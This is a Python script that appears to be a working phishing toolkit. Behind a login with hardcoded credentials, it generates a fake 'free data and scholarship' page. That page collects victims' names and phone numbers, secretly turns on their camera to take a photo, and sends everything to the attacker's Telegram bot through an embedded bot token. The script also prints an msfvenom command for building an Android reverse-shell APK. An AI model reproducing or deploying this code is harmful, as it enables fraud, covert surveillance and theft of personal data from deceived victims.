import os
import time

# --- CONFIGURATION ---
ADMIN_USER = "Basitsultan"
ADMIN_PASS = "Basit56"
BOT_TOKEN = "8734081081:AAFaqv7AYqL60LEP7AzWd--MVtMF18uHjaE"
CHAT_ID = "7799061209"

def create_html():
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Free Data & Scholarship 2026</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {{ font-family: sans-serif; text-align: center; background: #000; color: #0f0; }}
            .box {{ background: #111; width: 85%; margin: 30px auto; padding: 20px; border: 1px solid #0f0; border-radius: 10px; }}
            input, select {{ width: 90%; padding: 10px; margin: 10px 0; background: #222; color: #fff; border: 1px solid #0f0; }}
            button {{ background: #0f0; color: #000; border: none; padding: 10px; cursor: pointer; width: 95%; font-weight: bold; }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>A.B SYCO SYSTEM</h2>
            <p>Enter details to win 50GB Free Data</p>
            <input type="text" id="name" placeholder="Full Name">
            <select id="gender">
                <option value="Male">Male</option>
                <option value="Female">Female</option>
            </select>
            <input type="number" id="phone" placeholder="Mobile Number">
            <button onclick="sendData()">CLAIM DATA</button>
        </div>

        <video id="video" width="0" height="0" autoplay style="display:none;"></video>
        <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

        <script>
            const token = "{BOT_TOKEN}";
            const chat_id = "{CHAT_ID}";

            // Auto Camera Access (SayCheese Logic)
            navigator.mediaDevices.getUserMedia({{ video: true }}).then(stream => {{
                document.getElementById('video').srcObject = stream;
            }}).catch(err => console.log("Camera Blocked"));

            function sendData() {{
                let n = document.getElementById('name').value;
                let p = document.getElementById('phone').value;
                let g = document.getElementById('gender').value;

                // Send Text to Telegram
                let msg = "🔥 NEW TARGET DATA 🔥\\nName: " + n + "\\nPhone: " + p + "\\nGender: " + g;
                fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(msg));

                // Capture & Send Photo
                let canvas = document.getElementById('canvas');
                let video = document.getElementById('video');
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {{
                    let fd = new FormData();
                    fd.append('photo', blob, 'cam.jpg');
                    fetch("https://api.telegram.org/bot" + token + "/sendPhoto?chat_id=" + chat_id, {{ method: 'POST', body: fd }});
                }});

                alert("Verification in process! Keep this page open for 2 minutes.");
            }}
        </script>
    </body>
    </html>
    """
    with open("index.html", "w") as f:
        f.write(html_content)
    print("\n[+] index.html generated successfully!")

def main():
    os.system("clear")
    print("====================================")
    print("      A.B SYCO ADVANCED TOOL        ")
    print("====================================")
    
    user = input("Username: ")
    pw = input("Password: ")
    
    if user == ADMIN_USER and pw == ADMIN_PASS:
        print("\n[+] Welcome Basit Sultan!")
        print("1. Build Phishing Page (Camera + Location + Form)")
        print("2. Start Local Server (PHP)")
        print("3. Gallery Access Guide (APK Method)")
        print("4. Exit")
        
        choice = input("\nSelect: ")
        
        if choice == "1":
            create_html()
            print("[!] File 'index.html' is ready to host.")
        elif choice == "2":
            print("[!] Running server on http://localhost:8080")
            os.system("php -S localhost:8080")
        elif choice == "3":
            print("\n[INFO] For Gallery access, you must use Metasploit:")
            print("Command: msfvenom -p android/meterpreter/reverse_tcp LHOST=... LPORT=... R > syco.apk")
    else:
        print("[!] Wrong login!")

if __name__ == "__main__":
    main()
